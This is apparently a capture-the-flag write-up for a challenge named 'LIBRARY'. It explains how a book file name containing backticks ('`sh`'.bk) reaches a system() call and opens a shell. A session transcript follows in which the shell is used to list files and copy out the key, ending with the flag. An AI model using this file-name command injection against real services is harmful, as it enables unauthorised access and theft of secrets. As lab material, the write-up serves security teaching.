## LIBRARY [120]

## Solution
Looking at disassembly in IDA, we can see that book names must end in `".bk"` and the first four bytes of the contents must be `"BBBB"`. Add a book and use backticks in the file name to inject a shell. Then list the books and the call to `system()` on the book name will spawn the shell. You will not be able to see `stdout` nor `stderr` in the shell, but you can just redirect command output to a folder in `/tmp` and look at it later (or at the same time with a different SSH session):
```
ameise@shell:/tmp/ameise$ nc localhost 54567
Welcome to our library! What can I do for you?
  1. Upload book
  2. List books
  3. Delete books
  4. Quit

Enter command: 1
Book filename: '`sh`'.bk
e-book contents: 
BBBB
Welcome to our library! What can I do for you?
  1. Upload book
  2. List books
  3. Delete books
  4. Quit

Enter command: 2
Book list:
Size	E-book
ls > /tmp/ameise/ls.out

[...]

ameise@shell:~$ cat /tmp/ameise/ls.out 
key
lib
library

[...]

cat key > /tmp/ameise/key

[...]

ameise@shell:~$ cat /tmp/ameise/key
e033126167415751e1bde7254257d3c4
```
